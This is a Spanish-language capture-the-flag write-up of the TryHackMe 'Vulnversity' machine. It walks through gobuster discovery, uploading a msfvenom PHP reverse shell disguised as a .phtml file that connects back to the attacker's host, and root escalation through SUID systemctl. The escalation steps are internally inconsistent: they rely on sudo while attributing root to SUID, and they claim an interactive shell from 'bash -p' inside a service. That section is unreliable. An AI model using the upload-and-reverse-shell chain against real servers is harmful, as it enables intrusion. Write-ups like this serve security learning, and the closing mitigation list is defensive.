# Vulnversity

**Conceptos clave:** Gobuster discovery, .phtml file upload, reverse shell via curl, SUID systemctl abuse, custom systemd service, bash -p privilege escalation, root flag capture.
**Dificultad:** 🟢 Fácil
**Plataforma:** TryHackMe
**Fecha:** 18 de noviembre de 2026

## 1. Reconocimiento (Recon)

### 1.1 Escaneo rápido de puertos
```bash
nmap -p- --open -T5 -v -n <IP>
```
- `-p-` escanea todos los puertos, `--open` muestra solo los abiertos, `-T5` velocidad máxima, `-n` sin resolución DNS.

### 1.2 Escaneo completo con versiones y scripts NSE
```bash
nmap -sS -sV -A -T4 -p- -oN nmap_full.txt <IP>
```
- `-sS` SYN‑scan, `-sV` detección de versión, `-A` scripts + OS detection, `-oN` salida legible.

### 1.3 Enumeración de la web
```bash
# Gobuster descubre la ruta /internal
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt \
    -t 50 -x php,html,js,phtml -s "200,301,302,403"
```
El escaneo revela `http://<IP>/internal/`, que sirve una página de subida de ficheros en el puerto **3333**.

## 2. Acceso Inicial (Initial Access)

### 2.1 File upload con extensión *.phtml*
El formulario aceptaba cualquier archivo con extensión **.phtml**. Creamos una web‑shell PHP que hace reverse‑connect a nuestro listener:
```bash
# Payload PHP reverse shell (msfvenom)
msfvenom -p php/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f raw > shell.phtml
```
Subimos `shell.phtml` a `http://<IP>:3333/internal/`.

### 2.2 Obtener la shell
En una terminal escuchamos:
```bash
nc -nlvp 4444
```
En otra terminal ejecutamos un simple `curl -I` a la ruta del archivo subido:
```bash
curl -I http://<IP>:3333/internal/uploads/shell.phtml
```
El servidor ejecuta el script y la conexión reverse nos devuelve una **shell interactiva** como el usuario **bill**.

### 2.3 Flag de usuario
```bash
cat /home/bill/user.txt
```
Obtuvimos la flag `user.txt`.

## 3. Escalada de Privilegios (Privilege Escalation)

### 3.1 Enumeración de binarios SUID
```bash
find / -perm -4000 -type f 2>/dev/null | grep systemctl
```
Se encontró **/bin/systemctl** con SUID.

### 3.2 Creación de un servicio malicioso
```bash
cat <<EOF | sudo tee /etc/systemd/system/export.service
[Unit]
Description=Export Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -p"

[Install]
WantedBy=multi-user.target
EOF
```
Habilitamos el servicio:
```bash
sudo systemctl enable export.service
sudo systemctl start export.service
```
El proceso se ejecutó como **root** gracias al SUID de `systemctl`. Dentro del servicio lanzamos `bash -p` para obtener una **shell privilegiada**.

### 3.3 Flag de root
```bash
cat /root/root.txt
```
Capturamos la flag **root.txt**.

## 4. Post‑Explotación / Cracking
(En esta máquina no se requirió extracción de hashes ni cracking adicional.)

## 5. Flags
| Flag | Ruta |
|------|------|
| `user.txt` | `/home/bill/user.txt` |
| `root.txt` | `/root/root.txt` |

## 6. Mitigación / Remediación
- **Validar extensiones de carga**: aceptar solo tipos estrictamente necesarios y validar MIME; bloquear extensiones ejecutables como `.phtml`.
- **Revisar binarios SUID**: eliminar `systemctl` con SUID o limitar su uso mediante `sudoers`.
- **Hardening de systemd**: desactivar la capacidad de crear/activar servicios por usuarios no privilegiados.
- **Parchear y actualizar**: aplicar actualizaciones de seguridad del kernel y del paquete `systemd` que corrigen este tipo de abuso.
- **Seguridad en puertos de gestión**: restringir el acceso al puerto 3333 a IPs de confianza o mover la funcionalidad a una zona aislada.

*Escrito por Juan Merino Garrido – Estudiante de Ingeniería Informática*